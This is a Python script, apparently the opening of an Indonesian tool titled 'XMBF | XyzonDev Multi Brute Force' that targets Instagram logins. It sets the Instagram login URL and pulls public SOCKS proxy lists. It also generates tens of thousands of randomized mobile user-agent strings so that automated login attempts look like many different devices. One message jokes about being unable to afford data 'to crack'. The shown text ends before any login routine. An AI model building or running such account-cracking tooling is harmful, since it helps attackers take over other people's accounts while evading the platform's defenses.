# coding:utf-8
#/usr/bin/python
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
try:
	import json
	import uuid
	import hmac
	import rich
	import random
	import hashlib
	import urllib
	import urllib.request
	import calendar
except ImportError as e:
	exit(f'[!] {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
from rich.progress import track
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.tree import Tree
from rich import print as prints
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich import print as cetak

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())

insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'

merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
hapus  = '[/]'
biru_m = '[bold cyan]'

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

color_table = "#FFFFFF"
color_rich = "[#00C8FF]"
sys.stdout.write('\x1b]2; Insta Vindra XD\x07')

try:os.mkdir('data')
except:pass
try:os.mkdir('result')
except:pass

CY='\033[96;1m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
M3 = "[#d700d7]" # Magenta
bc = '[bold cyan]'
R2 = random.choice([M3, J2, H2, K2, O2, N2, M2, B2])

a = "[#8700af]"
b = "[#87875f]"
c = "[#8787af]"
d = "[#87afff]"
e = "[#87ff00]"
R3 = random.choice([a, b, c, d, e])

USN = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 Instagram 32.0.0.14.97 (iPhone10,6; iOS 11_1_1; ru_UA; ru-UA; scale=3.00; gamut=wide; 1125x2436)"

internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],[]
HARIS, HARIS1, method, ugen, ugen3, ugen2, baru, zx, prox, menudump, uazpepek = {}, {}, [], [], [], [], [], [], [], [], []
s = requests.Session()
UaNgentodMuach = []

def uazku():
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; ru-ru; Redmi K20 Pro Premium Edition Build/QKQ1.{str(rr(111111,199999))}.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(71,99))}.0.{str(rr(3500,3900))}.{str(rr(140,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.5.2-go"
    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-G950W Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Flipboard/4.3.0/{str(rr(5300,5500))},4.3.0.{str(rr(5300,5500))}"
    uazku3 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36	Android"
    uazku4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; Infinix X683 Build/QP1A.{str(rr(111111,199999))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5300,5900))}.{str(rr(75,150))} Mobile Safari/537.36 GoogleApp/13.47.8.26.arm64"
    uazku5 = f"Mozilla/5.0 (Linux; Android {str(rr(1,8))}.1.0; VSD243 Build/OPM8.{str(rr(111111,199999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(60,75))}.0.{str(rr(3100,3500))}.{str(rr(75,99))} Safari/537.36"
    uazku6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,7))}.{str(rr(1,5))}; EK-GC200 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36"
    uazku7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5500,5900))}.{str(rr(120,150))} Mobile Safari/537.36"
    uazku8 = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5, uazku6, uazku7]))
    return uazku8

for xc in range(1000):
    rr = random.randint
    rc = random.choice
    uaz1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; zh-CN; Infinix X6511B Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(2500,2900))}.{str(rr(75,150))} HiBrowser/2.5.016 UWS/ Mobile Safari/537.36"
    uaz2 = f"Mozilla/5.0 (Linux; Android 11; RMX3195 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} YaBrowser/22.1.0.{str(rr(190,199))} (lite) Mobile Safari/537.36"
    uaz3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; OPPO; CPH2197; OP4F39L1; qcom; de_DE; {str(rr(422222222,499999999))})"
    uainsta = str(rc([uaz1, uaz2, uaz3]))
    baru.append(uainsta)

for aditya in range(10000):
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; Android 13; V2124 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]"
    uazku2 = f"Mozilla/5.0 (Linux; Android 10; vivo 2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36"
    uazku3 = f"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 1520) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537 UCBrowser/4.2.1.541 Mobile"
    uazstart = str(rc([uazku1, uazku2, uazku3]))
    uazpepek.append(uazstart)

for NazriXDGantengNgab in range(1000):
   android1 = rc(["3","4","5","6","7","8","9","10","11","12"])
   android2 = rc(["1.5","1.6","2.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.0","8.1.0","4.4.4","5.1","6.3"])
   adtyaxcc = rc(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
   aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
   chrome1 = rr(73,99)
   chrome2 = rr(4500,4900)
   chrome3 = rr(75,150)
   chrome4 = rr(111111,199999)
   buildhan = rc([
                  "MMB29P",
                  "MMB29K",
                  "LRX22G",
                  "LMY48B",
                  "JZO54K",
                  "KTU84P",
                  "KOT49H",
                  "JDQ39"])
   deviceku = rc([
                  "Lenovo TB-X104X",
                  "SM-G930VC",
                  "Nexus 6P",
                  "SAMSUNG SM-T550",
                  "HTC Legend 1.32.163.1",
                  "HTC_TATTOO_A3288",
                  "Nexus One",
                  "LG-L1100",
                  "SonyEricssonX10i",
                  "SM-A510F",
                  "SM-T560",
                  "B3-A20",
                  "XT720"])
   ugent1 = f"Mozilla/5.0 (Linux; Android {android1}; SM-R825F Build/QP1A.{chrome4}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36"
   ugent2 = f"Mozilla/5.0 (Linux; U; Android {android2}; {adtyaxcc}; {deviceku} Build/{buildhan}) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
   ugent3 = f"Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.{chrome4}.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36 OPR/48.2.{chrome2}.133{chrome3}"
   adtyaUAmain = rc([ugent1,ugent2,ugent3])
   UaNgentodMuach.append(adtyaUAmain)
   

try:
    with requests.Session() as ses:
        _url = ses.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
        for xc in _url.splitlines():
            prox.append(xc)
except requests.exceptions.ConnectionError:
    print(f"{P}[{M}!{P}] koneksi internet anda bermasalah")
    time.sleep(0.3)
    exit()

try:
	with requests.Session() as ses:
	      url = ses.get("http://ip-api.com/json/").json()
	      IP  = url["query"]
	      CN = url["country"]
	      RN = url["regionName"]
	      AS = url["as"]
	      TZ = url["timezone"]
	      CC = url["countryCode"]
except KeyError:
	IP = "-"
	CN = "-"
	RN = "-"
	AS = "-"
	CC = "-"

def clear():
	try:os.system('clear')
	except:pass

def RemoveCookie():
    try:os.remove("data/cookie.txt")
    except:pass
    try:os.remove("data/user.txt")
    except:pass

#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#------------------[  MODULE  ]-------------------#
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ GLOBAL NAME ]-------------------#
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; XMBF | XyzonDev Multi Brute Force\x07')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \x1b[1;97mLu Kagak Ada paket anjirt sihlakan beli paket di sugeng kalo mau carck')
	print('\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \x1b[1;97mBtw Lu Miskin Yak Beli Paket Aja Kagak Mampu Awokawokawokawok')
	print('\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSalam Dari BintangTzy And Xyzon Dev ')
prox=open('.prox.txt','r').read().splitlines()
###----------[ GENERATE USERAGENT ]---------- ###
for xd in range(10000):
	a=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen2.append(uaku)

#------------[ UBAH UA DIH SINI OM ]---------------#
for t in range(10000):
	a=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['JZO54K','LMY47V','LMY48B','LRX22C','LRX21V','LRX22G','LRX21T'])
	c=random.randrange(111111,210000)
	d=random.randrange(11,19)
	e=random.randrange(73,100)
	f=random.randrange(4200,4900)
	g=random.randrange(40,150)
	random1=random.choice(['SAMSUNG SM-T530','SAMSUNG SM-T530','SAMSUNG SM-T805','SAMSUNG SM-G928F','SAMSUNG SM-W2021','SAMSUNG-SM-G530AZ','SAMSUNG SM-G925K','SAMSUNG SM-G925L','SAMSUNG SM-G925T','SAMSUNG-SM-T337A','SAMSUNG SM-J110F','SAMSUNG-SM-G890A','SAMSUNG SM-T355Y','SAMSUNG SM-T817T','SAMSUNG SM-G925F','GT-I9000'])
	xyzon1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon2=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.1 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon3=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.1 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon4=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon5=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon6=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.4 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon7=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon8=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.6 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon9=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.7 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon10=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.8 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon11=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.9 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon12=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon13=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon14=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon15=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon16=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.3 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon17=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.4 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon18=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.5 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon19=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.6 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon20=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.7 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon21=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.8 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon22=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.9 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon23=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/1.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon24=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/1.1 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon25=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/1.2 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon26=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon27=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.1 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon28=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.2 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon29=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.3 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon30=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon31=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon32=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon33=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.5 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon34=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.6 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon35=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.7 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon36=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.8 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon37=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.8 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon38=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.9 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon39=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon40=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.1 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon41=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon42=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon43=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon44=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon45=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon46=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon47=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	xyzon48=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	uaku2 = random.choice([xyzon1,xyzon2,xyzon3,xyzon4,xyzon5,xyzon6,xyzon7,xyzon8,xyzon9,xyzon10,xyzon11,xyzon12,xyzon13,xyzon14,xyzon15,xyzon16,xyzon17,xyzon18,xyzon19,xyzon20,xyzon21,xyzon22,xyzon23,xyzon24,xyzon25,xyzon26,xyzon27,xyzon28,xyzon29,xyzon30,xyzon31,xyzon32,xyzon33,xyzon34,xyzon35,xyzon36,xyzon37,xyzon38,xyzon39,xyzon40,xyzon41,xyzon42,xyzon43,xyzon44,xyzon45,xyzon46,xyzon47,xyzon48])
	ugen.append(uaku2)
		
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='Linux; Android 7.1.2; Redmi 4A)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile Safari/E7FBAF'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
